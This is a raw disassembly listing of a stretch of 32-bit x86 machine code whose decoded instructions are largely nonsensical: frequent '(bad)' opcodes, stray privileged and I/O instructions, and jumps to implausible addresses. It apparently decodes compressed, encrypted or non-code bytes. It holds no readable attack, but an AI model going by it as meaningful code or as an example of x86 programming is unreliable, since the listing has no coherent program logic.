  404728:	ec                   	in     (%dx),%al
  404729:	e1 bf                	loope  0x4046ea
  40472b:	7a d9                	jp     0x404706
  40472d:	c6                   	(bad)
  40472e:	f5                   	cmc
  40472f:	4a                   	dec    %edx
  404730:	f1                   	int1
  404731:	b2 e0                	mov    $0xe0,%dl
  404733:	91                   	xchg   %eax,%ecx
  404734:	11 79 44             	adc    %edi,0x44(%ecx)
  404737:	88 db                	mov    %bl,%bl
  404739:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40473a:	b0 4d                	mov    $0x4d,%al
  40473c:	08 db                	or     %bl,%bl
  40473e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40473f:	b0 5d                	mov    $0x5d,%al
  404741:	08 dd                	or     %bl,%ch
  404743:	52                   	push   %edx
  404744:	20 83 e7 70 0c d0    	and    %al,-0x2ff38f19(%ebx)
  40474a:	f7 20                	mull   (%eax)
  40474c:	ad                   	lods   %ds:(%esi),%eax
  40474d:	fe                   	(bad)
  40474e:	26 ca c1 34          	es lret $0x34c1
  404752:	78 9a                	js     0x4046ee
  404754:	3e 85 6a 35          	test   %ebp,%ds:0x35(%edx)
  404758:	85 75 6a             	test   %esi,0x6a(%ebp)
  40475b:	ac                   	lods   %ds:(%esi),%al
  40475c:	bc 28 bb 56 17       	mov    $0x1756bb28,%esp
  404761:	6b f3 e4             	imul   $0xffffffe4,%ebx,%esi
  404764:	58                   	pop    %eax
  404765:	6b 26 c6             	imul   $0xffffffc6,(%esi),%esp
  404768:	5a                   	pop    %edx
  404769:	af                   	scas   %es:(%edi),%eax
  40476a:	e8 be 9d b3 ca       	call   0xcaf3e52d
  40476f:	e0 dd                	loopne 0x40474e
  404771:	ce                   	into
  404772:	db a5 a4 bf 67 93    	(bad) -0x6c98405c(%ebp)
  404778:	f5                   	cmc
  404779:	d3 54 7d 4d          	rcll   %cl,0x4d(%ebp,%edi,2)
  40477d:	d3 51 f8             	rcll   %cl,-0x8(%ecx)
  404780:	22 a8 7e f3 90 7f    	and    0x7f90f37e(%eax),%ch
  404786:	8f                   	(bad)
  404787:	71 c7                	jno    0x404750
  404789:	a2 bc fc bc a2       	mov    %al,0xa2bcfcbc
  40478e:	fc                   	cld
  40478f:	a2 82 a5 40 df       	mov    %al,0xdf40a582
  404794:	f4                   	hlt
  404795:	ea e6 bf 04 c3 fd 45 	ljmp   $0x45fd,$0xc304bfe6
  40479c:	d6                   	salc
  40479d:	49                   	dec    %ecx
  40479e:	00 df                	add    %bl,%bh
  4047a0:	e2 f1                	loop   0x404793
  4047a2:	0d 5c 4d b3 9a       	or     $0x9ab34d5c,%eax
  4047a7:	fa                   	cli
  4047a8:	7d 9e                	jge    0x404748
  4047aa:	de 2d 7e 5e e3 d5    	fisubrs 0xd5e35e7e
  4047b0:	33 01                	xor    (%ecx),%eax
  4047b2:	6e                   	outsb  %ds:(%esi),(%dx)
  4047b3:	c1 d3 b3             	rcl    $0xb3,%ebx
  4047b6:	5a                   	pop    %edx
  4047b7:	9a e0 b4 b3 d4 ef 79 	lcall  $0x79ef,$0xd4b3b4e0
  4047be:	66 ad                	lods   %ds:(%esi),%ax
  4047c0:	6d                   	insl   (%dx),%es:(%edi)
  4047c1:	a9 2e c7 e3 45       	test   $0x45e3c72e,%eax
  4047c6:	e8 bf 61 41 7f       	call   0x7f81a98a
  4047cb:	4d                   	dec    %ebp
  4047cc:	b7 57                	mov    $0x57,%bh
  4047ce:	7e 3f                	jle    0x40480f
  4047d0:	09 b7 44 6c e3 ea    	or     %esi,-0x151c93bc(%edi)
  4047d6:	6b 53 42 f9          	imul   $0xfffffff9,0x42(%ebx),%edx
  4047da:	b7 4f                	mov    $0x4f,%bh
  4047dc:	be 66 45 10 a7       	mov    $0xa7104566,%esi
  4047e1:	7e ef                	jle    0x4047d2
  4047e3:	91                   	xchg   %eax,%ecx
  4047e4:	bf 8f 14 e2 0f       	mov    $0xfe2148f,%edi
  4047e9:	86 05 98 2a 9c c7    	xchg   %al,0xc79c2a98
  4047ef:	d4 ef                	aam    $0xef
  4047f1:	7e 62                	jle    0x404855
  4047f3:	b0 30                	mov    $0x30,%al
  4047f5:	c0 23 e1             	shlb   $0xe1,(%ebx)
  4047f8:	5f                   	pop    %edi
  4047f9:	5b                   	pop    %ebx
  4047fa:	54                   	push   %esp
  4047fb:	fb                   	sti
  4047fc:	0f 32                	rdmsr
  4047fe:	f9                   	stc
  4047ff:	73 06                	jae    0x404807
  404801:	cb                   	lret
  404802:	3f                   	aas
  404803:	17                   	pop    %ss
  404804:	5f                   	pop    %edi
  404805:	b9 34 a8 df 49       	mov    $0x49dfa834,%ecx
  40480a:	a3 76 2c ea f7       	mov    %eax,0xf7ea2c76
  40480f:	8a 44 46 21          	mov    0x21(%esi,%eax,2),%al
  404813:	f1                   	int1
  404814:	ea d1 0c 57 ce 9c 93 	ljmp   $0x939c,$0xce570cd1
  40481b:	6c                   	insb   (%dx),%es:(%edi)
  40481c:	06                   	push   %es
  40481d:	4b                   	dec    %ebx
  40481e:	2c 67                	sub    $0x67,%al
  404820:	3f                   	aas
  404821:	31 7b e6             	xor    %edi,-0x1a(%ebx)
  404824:	73 49                	jae    0x40486f
  404826:	36 a8 e4             	ss test $0xe4,%al
  404829:	df 9f 81 86 99 fb    	fistps -0x466797f(%edi)
  40482f:	12 cc                	adc    %ah,%cl
  404831:	f0 37                	lock aaa
  404833:	e2 b3                	loop   0x4047e8
  404835:	c4 a3 63 39 e7 12    	les    0x12e73963(%ebx),%esp
  40483b:	4b                   	dec    %ebx
  40483c:	89 5b 48             	mov    %ebx,0x48(%ebx)
  40483f:	5f                   	pop    %edi
  404840:	31 d3                	xor    %edx,%ebx
  404842:	82 e7 26             	and    $0x26,%bh
  404845:	12 7f 4d             	adc    0x4d(%edi),%bh
  404848:	ca 29 33             	lret   $0x3329
  40484b:	8f                   	(bad)
  40484c:	8d 33                	lea    (%ebx),%esi
  40484e:	c3                   	ret
  40484f:	7b a9                	jnp    0x4047fa
  404851:	e5 f1                	in     $0xf1,%eax
  404853:	66 38 62 e3          	data16 cmp %ah,-0x1d(%edx)
  404857:	2d df 1a cf ed       	sub    $0xedcf1adf,%eax
  40485c:	fd                   	std
  40485d:	f0 6b b3 19 f6 24 fe 	lock imul $0x23,-0x1db09e7(%ebx),%esi
  404864:	23 
  404865:	cb                   	lret
  404866:	0c 97                	or     $0x97,%al
  404868:	26 73 b6             	es jae 0x404821
  40486b:	85 94 c7 87 c1 65 29 	test   %edx,0x2965c187(%edi,%eax,8)
  404872:	2c 2d                	sub    $0x2d,%al
  404874:	0a ae 4d 78 38 63    	or     0x6338784d(%esi),%ch
  40487a:	0b 1c 97             	or     (%edi,%edx,4),%ebx
  40487d:	c4 9f 84 6f a4 3e    	les    0x3ea46f84(%edi),%ebx
  404883:	9c                   	pushf
  404884:	61                   	popa
  404885:	86 37                	xchg   %dh,(%edi)
  404887:	12 f8                	adc    %al,%bh
  404889:	59                   	pop    %ecx
  40488a:	17                   	pop    %ss
  40488b:	27                   	daa
  40488c:	d6                   	salc
  40488d:	66 c5 c0 fb          	(bad)
  404891:	d1 77 63             	shll   $1,0x63(%edi)
  404894:	9b                   	fwait
  404895:	b3 e3                	mov    $0xe3,%bl
  404897:	8f                   	(bad)
  404898:	33 9a c1 83 ed 84    	xor    -0x7b127c3f(%edx),%ebx
  40489e:	c1 99 29 cf 25 c5 c1 	rcrl   $0xc1,-0x3ada30d7(%ecx)
  4048a5:	92                   	xchg   %eax,%edx
  4048a6:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4048a7:	bf 26 99 e1 b8       	mov    $0xb8e19926,%edi
  4048ac:	78 de                	js     0x40488c
  4048ae:	da 05 b1 bc fe 19    	fiaddl 0x19febcb1
  4048b4:	16                   	push   %ss
  4048b5:	6e                   	outsb  %ds:(%esi),(%dx)
  4048b6:	af                   	scas   %es:(%edi),%eax
  4048b7:	23 e5                	and    %ebp,%esp
  4048b9:	99                   	cltd
  4048ba:	68 ce ab e9 5a       	push   $0x5ae9abce
  4048bf:	4f                   	dec    %edi
  4048c0:	25 f2 d2 db b3       	and    $0xb3dbd2f2,%eax
  4048c5:	38 0f                	cmp    %cl,(%edi)
  4048c7:	50                   	push   %eax
  4048c8:	e9 0e e0 57 0f       	jmp    0xf9828db
  4048cd:	c7                   	(bad)
  4048ce:	ab                   	stos   %eax,%es:(%edi)
  4048cf:	87 81 75 56 68 aa    	xchg   %eax,-0x5597a98b(%ecx)
  4048d5:	19 2e                	sbb    %ebp,(%esi)
  4048d7:	8c 2b                	mov    %gs,(%ebx)
  4048d9:	8f                   	(bad)
  4048da:	8f 82 e7 13 1f ce    	pop    -0x31e0ec19(%edx)
  4048e0:	88 82 a7 28 86 4c    	mov    %al,0x4c8628a7(%edx)
  4048e6:	2b af df 41 31 af    	sub    -0x50cebe21(%edi),%ebp
  4048ec:	8c ab 45 fa e8 dc    	mov    %gs,-0x231705bb(%ebx)
  4048f2:	e7 33                	out    %eax,$0x33
  4048f4:	b8 be 9c f2 f2       	mov    $0xf2f29cbe,%eax
  4048f9:	db 79 54             	fstpt  0x54(%ecx)
  4048fc:	5f                   	pop    %edi
  4048fd:	27                   	daa
  4048fe:	70 8e                	jo     0x40488e
  404900:	02 57 72             	add    0x72(%edi),%dl
  404903:	31 ce                	xor    %ecx,%esi
  404905:	18 28                	sbb    %ch,(%eax)
  404907:	4b                   	dec    %ebx
  404908:	bc 3b 2e 06 2e       	mov    $0x2e062e3b,%esp
  40490d:	4d                   	dec    %ebp
  40490e:	ad                   	lods   %ds:(%esi),%eax
  40490f:	c4                   	(bad)
  404910:	c8 1f 9d 35          	enter  $0x9d1f,$0x35
  404914:	66 37                	data16 aaa
  404916:	c3                   	ret
  404917:	eb 76                	jmp    0x40498f
  404919:	ce                   	into
  40491a:	5b                   	pop    %ebx
  40491b:	ad                   	lods   %ds:(%esi),%eax
  40491c:	9c                   	pushf
  40491d:	6e                   	outsb  %ds:(%esi),(%dx)
  40491e:	56                   	push   %esi
  40491f:	1e                   	push   %ds
  404920:	9f                   	lahf
  404921:	08 99 09 5f 60 ff    	or     %bl,-0x9fa0f7(%ecx)
  404927:	64 24 2d             	fs and $0x2d,%al
  40492a:	98                   	cwtl
  40492b:	65 86 b8 24 3f f6 de 	xchg   %bh,%gs:-0x2109c0dc(%eax)
  404932:	a3 d8 42 1c 14       	mov    %eax,0x141c42d8
  404937:	60                   	pusha
  404938:	5e                   	pop    %esi
  404939:	71 30                	jno    0x40496b
  40493b:	23 91 67 67 4c 3c    	and    0x3c4c6767(%ecx),%edx
  404941:	0e                   	push   %cs
  404942:	f5                   	cmc
  404943:	43                   	inc    %ebx
  404944:	d4 1b                	aam    $0x1b
  404946:	67 61                	addr16 popa
  404948:	69 2a d8 ad 47 25    	imul   $0x2547add8,(%edx),%ebp
  40494e:	e2 88                	loop   0x4048d8
  404950:	60                   	pusha
  404951:	3f                   	aas
  404952:	f0 b1 5c             	lock mov $0x5c,%cl
  404955:	4f                   	dec    %edi
  404956:	43                   	inc    %ebx
  404957:	ca e8 7f             	lret   $0x7fe8
  40495a:	d1 10                	rcll   $1,(%eax)
  40495c:	6a b8                	push   $0xffffffb8
  40495e:	d8 5c 41 f6          	fcomps -0xa(%ecx,%eax,2)
  404962:	08 aa 0b d2 2e 36    	or     %ch,0x362ed20b(%edx)
  404968:	f3 f1                	repz int1
  40496a:	8c a0 b2 a6 24 5e    	mov    %fs,0x5e24a6b2(%eax)
  404970:	66 06                	pushw  %es
  404972:	3b 30                	cmp    (%eax),%esi
  404974:	3c 67                	cmp    $0x67,%al
  404976:	47                   	inc    %edi
  404977:	fc                   	cld
  404978:	7b c9                	jnp    0x404943
  40497a:	b5 e8                	mov    $0xe8,%ch
  40497c:	c5 53 d9             	lds    -0x27(%ebx),%edx
  40497f:	7b 09                	jnp    0x40498a
  404981:	ef                   	out    %eax,(%dx)
  404982:	25 57 c0 5c e1       	and    $0xe15cc057,%eax
  404987:	cd cd                	int    $0xcd
  404989:	52                   	push   %edx
  40498a:	bd 54 9a 61 77       	mov    $0x77619a54,%ebp
  40498f:	c6                   	(bad)
  404990:	73 2f                	jae    0x4049c1
  404992:	07                   	pop    %es
  404993:	e6 50                	out    %al,$0x50
  404995:	d9 f5                	fprem1
  404997:	71 aa                	jno    0x404943
  404999:	37                   	aaa
  40499a:	9f                   	lahf
  40499b:	bc 35 a9 aa b7       	mov    $0xb7aaa935,%esp
  4049a0:	90                   	nop
  4049a1:	6a 5e                	push   $0x5e
  4049a3:	1b cb                	sbb    %ebx,%ecx
  4049a5:	bd 5c 58 04 43       	mov    $0x4304585c,%ebp
  4049aa:	2c 1a                	sub    $0x1a,%al
  4049ac:	aa                   	stos   %al,%es:(%edi)
  4049ad:	92                   	xchg   %eax,%edx
  4049ae:	54                   	push   %esp
  4049af:	6f                   	outsl  %ds:(%esi),(%dx)
  4049b0:	19 b0 f4 68 d8 90    	sbb    %esi,-0x6f27970c(%eax)
  4049b6:	91                   	xchg   %eax,%ecx
  4049b7:	9c                   	pushf
  4049b8:	c6                   	(bad)
  4049b9:	bd 15 e4 65 a4       	mov    $0xa465e415,%ebp
  4049be:	73 af                	jae    0x40496f
  4049c0:	04 5a                	add    $0x5a,%al
  4049c2:	c9                   	leave
  4049c3:	bb 2a 8d 7b 0e       	mov    $0xe7b8d2a,%ebx
  4049c8:	9c                   	pushf
  4049c9:	dd dc                	fstp   %st(4)
  4049cb:	bb 83 bc 2a d8       	mov    $0xd82abc83,%ebx
  4049d0:	4d                   	dec    %ebp
  4049d1:	de 76 f2             	fidivs -0xe(%esi)
  4049d4:	1a e1                	sbb    %cl,%ah
  4049d6:	3c f2                	cmp    $0xf2,%al
  4049d8:	5e                   	pop    %esi
  4049d9:	a3 f3 8e 85 5f       	mov    %eax,0x5f858ef3
  4049de:	92                   	xchg   %eax,%edx
  4049df:	67 25 af 0b 1e 20    	addr16 and $0x201e0baf,%eax
  4049e5:	ef                   	out    %eax,(%dx)
  4049e6:	4a                   	dec    %edx
  4049e7:	f2 ba e1 09 f2 9e    	repnz mov $0x9ef209e1,%edx
  4049ed:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4049ee:	f3 fa                	repz cli
  4049f0:	e1 65                	loope  0x404a57
  4049f2:	f2 aa                	repnz stos %al,%es:(%edi)
  4049f4:	c8 3b 01 0e          	enter  $0x13b,$0xe
  4049f8:	93                   	xchg   %eax,%ebx
  4049f9:	b7 87                	mov    $0x87,%bh
  4049fb:	bc 33 e1 0b f2       	mov    $0xf20be133,%esp
  404a00:	cc                   	int3
  404a01:	74 de                	je     0x4049e1
  404a03:	7e 08                	jle    0x404a0d
  404a05:	65 dc 6b a5          	fsubrl %gs:-0x5b(%ebx)
  404a09:	b2 cb                	mov    $0xcb,%dl
  404a0b:	c0 4e 9e 93          	rorb   $0x93,-0x62(%esi)
  404a0f:	ca 86 21             	lret   $0x2186
  404a12:	9b                   	fwait
  404a13:	3c 0f                	cmp    $0xf,%al
  404a15:	e5 f0                	in     $0xf0,%eax
  404a17:	2b 58 4a             	sub    0x4a(%eax),%ebx
  404a1a:	de 57 54             	ficoms 0x54(%edi)
  404a1d:	f3 36 a8 22          	repz ss test $0x22,%al
  404a21:	ef                   	out    %eax,(%dx)
  404a22:	28 aa 79 2f b4 92    	sub    %ch,-0x6d4bd087(%edx)
  404a28:	97                   	xchg   %eax,%edi
  404a29:	4a                   	dec    %edx
  404a2a:	35 1f 81 ad 8c       	xor    $0x8cad811f,%eax
  404a2f:	f7 75 83             	divl   -0x7d(%ebp)
  404a32:	2d 39 ad 16 1e       	sub    $0x1e16ad39,%eax
  404a37:	87 7e 2a             	xchg   %edi,0x2a(%esi)
  404a3a:	fb                   	sti
  404a3b:	1d d5 fc 5a 78       	sbb    $0x785afcd5,%eax
  404a40:	8f                   	(bad)
  404a41:	90                   	nop
  404a42:	c7                   	(bad)
  404a43:	d8 a9 e4 15 91 67    	fsubrs 0x679115e4(%ecx)
  404a49:	61                   	popa
  404a4a:	e7 93                	out    %eax,$0x93
  404a4c:	f7 0b f2 a2 d9 08    	testl  $0x8d9a2f2,(%ebx)
  404a52:	79 6f                	jns    0x404ac3
  404a54:	99                   	cltd
  404a55:	b9 97 c8 ee 25       	mov    $0x25eec897,%ecx
  404a5a:	cf                   	iret
  404a5b:	47                   	inc    %edi
  404a5c:	65 e9 ec 31 f2 16    	gs jmp 0x17327c4e
  404a62:	53                   	push   %ebx
  404a63:	2c 73                	sub    $0x73,%al
  404a65:	d9 4b e4             	(bad) -0x1c(%ebx)
  404a68:	dd 4c 65 79          	fisttpll 0x79(%ebp,%eiz,2)
  404a6c:	ec                   	in     (%dx),%al
  404a6d:	30 79 61             	xor    %bh,0x61(%ecx)
  404a70:	14 cb                	adc    $0xcb,%al
  404a72:	32 f6                	xor    %dh,%dh
  404a74:	35 79 e7 52 cd       	xor    $0xcd52e779,%eax
  404a79:	72 36                	jb     0x404ab1
  404a7b:	43                   	inc    %ebx
  404a7c:	e1 de                	loope  0x404a5c
  404a7e:	e7 54                	out    %eax,$0x54
  404a80:	73 1d                	jae    0x404a9f
  404a82:	4b                   	dec    %ebx
  404a83:	51                   	push   %ecx
  404a84:	4e                   	dec    %esi
  404a85:	c1 11 db             	rcll   $0xdb,(%ecx)
  404a88:	8e b3 a5 02 5a 58    	mov    0x585a02a5(%ebx),%?
  404a8e:	a1 12 86 65 fb       	mov    0xfb658612,%eax
  404a93:	a2 b9 b7 99 2d       	mov    %al,0x2d99b7b9
  404a98:	25 6f 84 3c 0f       	and    $0xf3c846f,%eax
  404a9d:	ab                   	stos   %eax,%es:(%edi)
  404a9e:	52                   	push   %edx
  404a9f:	14 be                	adc    $0xbe,%al
  404aa1:	16                   	push   %ss
  404aa2:	e1 d4                	loope  0x404a78
  404aa4:	a8 85                	test   $0x85,%al
  404aa6:	1e                   	push   %ds
  404aa7:	b6 9e                	mov    $0x9e,%dh
  404aa9:	bc 7f 1b b9 e7       	mov    $0xe7b91b7f,%esp
  404aae:	13 de                	adc    %esi,%ebx
  404ab0:	5f                   	pop    %edi
  404ab1:	6c                   	insb   (%dx),%es:(%edi)
  404ab2:	dc 1b                	fcompl (%ebx)
  404ab4:	40                   	inc    %eax
  404ab5:	cf                   	iret
  404ab6:	c0 d4 2f             	rcl    $0x2f,%ah
  404ab9:	c9                   	leave
  404aba:	57                   	push   %edi
  404abb:	c0 a9 c2 0b 23 ef 34 	shrb   $0x34,-0x10dcf43e(%ecx)
  404ac2:	d6                   	salc
  404ac3:	84 15 5f 99 51 60    	test   %dl,0x6051995f
  404ac9:	60                   	pusha
  404aca:	50                   	push   %eax
  404acb:	1a b9 18 79 7d 08    	sbb    0x87d7918(%ecx),%bh
  404ad1:	67 51                	addr16 push %ecx
  404ad3:	34 e7                	xor    $0xe7,%al
  404ad5:	8d 51 25             	lea    0x25(%ecx),%edx
  404ad8:	06                   	push   %es
  404ad9:	b3 d9                	mov    $0xd9,%bl
  404adb:	6f                   	outsl  %ds:(%esi),(%dx)
  404adc:	5e                   	pop    %esi
  404add:	61                   	popa
  404ade:	d8 10                	fcoms  (%eax)
  404ae0:	a8 53                	test   $0x53,%al
  404ae2:	56                   	push   %esi
  404ae3:	23 3f                	and    (%edi),%edi
  404ae5:	8b e3                	mov    %ebx,%esp
  404ae7:	9c                   	pushf
  404ae8:	c3                   	ret
  404ae9:	38 8b 89 0f 44 73    	cmp    %cl,0x73440f89(%ebx)
  404aef:	66 da 38             	data16 fidivrl (%eax)
  404af2:	ef                   	out    %eax,(%dx)
  404af3:	05 ce 15 a4 9f       	add    $0x9fa415ce,%eax
  404af8:	6c                   	insb   (%dx),%es:(%edi)
  404af9:	e6 fc                	out    %al,$0xfc
  404afb:	3a 9e 73 0f e9 7d    	cmp    0x7de90f73(%esi),%bl
  404b01:	c4 42 2a             	les    0x2a(%edx),%eax
  404b04:	fd                   	std
  404b05:	bb 9d 73 c8 c2       	mov    $0xc2c8739d,%ebx
  404b0a:	f9                   	stc
  404b0b:	5a                   	pop    %edx
  404b0c:	06                   	push   %es
  404b0d:	e7 f5                	out    %eax,$0xf5
  404b0f:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404b10:	fc                   	cld
  404b11:	8e ea                	mov    %edx,%gs
  404b13:	9c                   	pushf
  404b14:	48                   	dec    %eax
  404b15:	e7 1e                	out    %eax,$0x1e
  404b17:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  404b18:	6b b5 24 73 7e 48 f6 	imul   $0xfffffff6,0x487e7324(%ebp),%esi
  404b1f:	69 a4 ef 25 56 52 3b 	imul   $0xc467d50a,0x3b525625(%edi,%ebp,8),%esp
  404b26:	0a d5 67 c4 
  404b2a:	77 48                	ja     0x404b74
  404b2c:	7f 92                	jg     0x404ac0
  404b2e:	ec                   	in     (%dx),%al
  404b2f:	5b                   	pop    %ebx
  404b30:	89 f3                	mov    %esi,%ebx
  404b32:	a9 ce af 50 e7       	test   $0xe750afce,%eax
  404b37:	39 f2                	cmp    %esi,%edx
  404b39:	8c b6 cd 28 43 5e    	mov    %?,0x5e4328cd(%esi)
  404b3f:	15 5a 69 b0 c1       	adc    $0xc1b0695a,%eax
  404b44:	b7 71                	mov    $0x71,%bh
  404b46:	5a                   	pop    %edx
  404b47:	be 6a ee ef 45       	mov    $0x45efee6a,%esi
  404b4c:	54                   	push   %esp
  404b4d:	1b 32                	sbb    (%edx),%esi
  404b4f:	60                   	pusha
  404b50:	5f                   	pop    %edi
  404b51:	78 2d                	js     0x404b80
  404b53:	da 3b                	fidivrl (%ebx)
  404b55:	a3 b8 d2 42 7c       	mov    %eax,0x7c42d2b8
  404b5a:	36 62 75 b0          	bound  %esi,%ss:-0x50(%ebp)
  404b5e:	4f                   	dec    %edi
  404b5f:	94                   	xchg   %eax,%esp
  404b60:	08 de                	or     %bl,%dh
  404b62:	c2 b6 88             	ret    $0x88b6
  404b65:	f5                   	cmc
  404b66:	c8 ab 23 b8          	enter  $0x23ab,$0xb8
  404b6a:	d2 1a                	rcrb   %cl,(%edx)
  404b6c:	59                   	pop    %ecx
  404b6d:	89 7c 87 38          	mov    %edi,0x38(%edi,%eax,4)
  404b71:	9d                   	popf
  404b72:	d6                   	salc
  404b73:	92                   	xchg   %eax,%edx
  404b74:	22 db                	and    %bl,%bl
  404b76:	90                   	nop
  404b77:	c7 85 74 21 87 42 fa 	movl   $0x5679a6fa,0x42872174(%ebp)
  404b7e:	a6 79 56 
  404b81:	64 d8 74 a3 ad       	fdivs  %fs:-0x53(%ebx,%eiz,4)
  404b86:	8a e6                	mov    %dh,%ah
  404b88:	11 26                	adc    %esp,(%esi)
  404b8a:	13 9f 0b af 46 be    	adc    -0x41b950f5(%edi),%ebx
  404b90:	10 52 36             	adc    %dl,0x36(%edx)
  404b93:	cd 73                	int    $0x73
  404b95:	af                   	scas   %es:(%edi),%eax
  404b96:	a1 ab 2c a1 bc       	mov    0xbca12cab,%eax
  404b9b:	b2 c3                	mov    $0xc3,%dl
  404b9d:	39 4f 27             	cmp    %ecx,0x27(%edi)
  404ba0:	db 13                	fistl  (%ebx)
  404ba2:	3a dd                	cmp    %ch,%bl
  404ba4:	ec                   	in     (%dx),%al
  404ba5:	d4 3e                	aam    $0x3e
  404ba7:	59                   	pop    %ecx
  404ba8:	16                   	push   %ss
  404ba9:	75 02                	jne    0x404bad
  404bab:	f2 c9                	repnz leave
  404bad:	c8 93 a7 79          	enter  $0xa793,$0x79
  404bb1:	d6                   	salc
  404bb2:	74 ea                	je     0x404b9e
  404bb4:	ec                   	in     (%dx),%al
  404bb5:	8c e4                	mov    %fs,%esp
  404bb7:	b9 7c 34 63 ba       	mov    $0xba63347c,%ecx
  404bbc:	f5                   	cmc
  404bbd:	ff f7                	push   %edi
  404bbf:	3a 19                	cmp    (%ecx),%bl
  404bc1:	f0 60                	lock pusha
  404bc3:	08 e7                	or     %ah,%bh
  404bc5:	9b                   	fwait
  404bc6:	64 ff 33             	push   %fs:(%ebx)
  404bc9:	94                   	xchg   %eax,%esp
  404bca:	f3 17                	repz pop %ss
  404bcc:	61                   	popa
  404bcd:	9c                   	pushf
  404bce:	1b c3                	sbb    %ebx,%eax
  404bd0:	39 5f 22             	cmp    %ebx,0x22(%edi)
  404bd3:	3b 89 32 3a 3e fc    	cmp    -0x3c1c5ce(%ecx),%ecx
  404bd9:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404bda:	f5                   	cmc
  404bdb:	80 83 7a ef fe 69 f6 	addb   $0xf6,0x69feef7a(%ebx)
  404be2:	5b                   	pop    %ebx
  404be3:	06                   	push   %es
  404be4:	5c                   	pop    %esp
  404be5:	33 e3                	xor    %ebx,%esp
  404be7:	dc 69 b6             	fsubrl -0x4a(%ecx)
  404bea:	7f 3f                	jg     0x404c2b
  404bec:	8d 51 6d             	lea    0x6d(%ecx),%edx
  404bef:	58                   	pop    %eax
  404bf0:	f5                   	cmc
  404bf1:	4f                   	dec    %edi
  404bf2:	8a 67 fa             	mov    -0x6(%edi),%ah
  404bf5:	63 f1                	arpl   %esi,%ecx
  404bf7:	e0 8c                	loopne 0x404b85
  404bf9:	8b ff                	mov    %edi,%edi
  404bfb:	eb 73                	jmp    0x404c70
  404bfd:	32 25 94 47 1b 3d    	xor    0x3d1b4794,%ah
  404c03:	cd b1                	int    $0xb1
  404c05:	93                   	xchg   %eax,%ebx
  404c06:	6b 4e 82 b9          	imul   $0xffffffb9,-0x7e(%esi),%ecx
  404c0a:	16                   	push   %ss
  404c0b:	39 83 78 2a e3 0c    	cmp    %eax,0xce32a78(%ebx)
  404c11:	33 71 6e             	xor    0x6e(%ecx),%esi
  404c14:	22 25 c5 c0 b9 97    	and    0x97b9c0c5,%ah
  404c1a:	14 45                	adc    $0x45,%al
  404c1c:	e1 cc                	loope  0x404bea
  404c1e:	24 16                	and    $0x16,%al
  404c20:	10 6d c4             	adc    %ch,-0x3c(%ebp)
  404c23:	8f 89 29 54          	(bad)
  404c27:	e7 71                	out    %eax,$0x71
  404c29:	e2 35                	loop   0x404c60
  404c2b:	c4 3b                	les    (%ebx),%edi
  404c2d:	89 87 88 e1 46 ce    	mov    %eax,-0x31b91e78(%edi)
  404c33:	eb a9                	jmp    0x404bde
  404c35:	e6 6a                	out    %al,$0x6a
  404c37:	e2 4b                	loop   0x404c84
  404c39:	74 ad                	je     0x404be8
  404c3b:	55                   	push   %ebp
  404c3c:	d4 fe                	aam    $0xfe
  404c3e:	16                   	push   %ss
  404c3f:	52                   	push   %edx
  404c40:	e6 91                	out    %al,$0x91
  404c42:	dd a4 d6 a1 fa 0b 29 	frstor 0x290bfaa1(%esi,%edx,8)
  404c49:	86 15 c4 47 a8 fe    	xchg   %dl,0xfea847c4
  404c4f:	23 54 e7 1a          	and    0x1a(%edi,%eiz,8),%edx
  404c53:	b2 4f                	mov    $0x4f,%dl
  404c55:	a0 9a 27 51 cd       	mov    0xcd51279a,%al
  404c5a:	7d c4                	jge    0x404c20
  404c5c:	3e 62 1d f1 3e e2 ad 	bound  %ebx,%ds:0xade23ef1
  404c63:	54                   	push   %esp
  404c64:	3f                   	aas
  404c65:	96                   	xchg   %eax,%esi
  404c66:	ec                   	in     (%dx),%al
  404c67:	db a8 7e 1b c5 73    	fldt   0x73c51b7e(%eax)
  404c6d:	3c 71                	cmp    $0x71,%al
  404c6f:	11 e9                	adc    %ebp,%ecx
  404c71:	7f 20                	jg     0x404c93
  404c73:	bd 91 6a 7e 47       	mov    $0x477e6a91,%ebp
  404c78:	bc 98 94 27 88       	mov    $0x88279498,%esp
  404c7d:	39 54 e7 2c          	cmp    %edx,0x2c(%edi,%eiz,8)
  404c81:	b2 3f                	mov    $0x3f,%dl
  404c83:	a3 d2 77 88 2f       	mov    %eax,0x2f8877d2
  404c88:	1b 6a a7             	sbb    -0x59(%edx),%ebp
  404c8b:	39 2e                	cmp    %ebp,(%esi)
  404c8d:	81 69 8f f5 74 ea bc 	subl   $0xbcea74f5,-0x71(%ecx)
  404c94:	18 7a 75             	sbb    %bh,0x75(%edx)
  404c97:	70 ac                	jo     0x404c45
  404c99:	95                   	xchg   %eax,%ebp
  404c9a:	d0 e9                	shr    $1,%cl
  404c9c:	ae                   	scas   %es:(%edi),%al
  404c9d:	39 0a                	cmp    %ecx,(%edx)
  404c9f:	ad                   	lods   %ds:(%esi),%eax
  404ca0:	54                   	push   %esp
  404ca1:	e1 74                	loope  0x404d17
  404ca3:	bf a8 67 ad a7       	mov    $0xa7ad67a8,%edi
  404ca8:	bb e6 fb 08 ad       	mov    $0xad08fbe6,%ebx
  404cad:	1d b5 b4 83 e6       	sbb    $0xe683b4b5,%eax
  404cb2:	5b                   	pop    %ebx
  404cb3:	36 f1                	ss int1
  404cb5:	cb                   	lret
  404cb6:	69 47 75 73 e4 75 d3 	imul   $0xd375e473,0x75(%edi),%eax
  404cbd:	ac                   	lods   %ds:(%esi),%al
  404cbe:	79 41                	jns    0x404d01
  404cc0:	e4 74                	in     $0x74,%al
  404cc2:	ef                   	out    %eax,(%dx)
  404cc3:	c1 5b 68 5d          	rcrl   $0x5d,0x68(%ebx)
  404cc7:	7d 32                	jge    0x404cfb
  404cc9:	8a c7                	mov    %bh,%al
  404ccb:	76 37                	jbe    0x404d04
  404ccd:	3d 11 d4 55 f7       	cmp    $0xf755d411,%eax
  404cd2:	7c 2a                	jl     0x404cfe
  404cd4:	9d                   	popf
  404cd5:	fe                   	(bad)
  404cd6:	7a 3b                	jp     0x404d13
  404cd8:	39 f7                	cmp    %esi,%edi
  404cda:	d3 a6 bd d2 36 44    	shll   %cl,0x4436d2bd(%esi)
  404ce0:	4c                   	dec    %esp
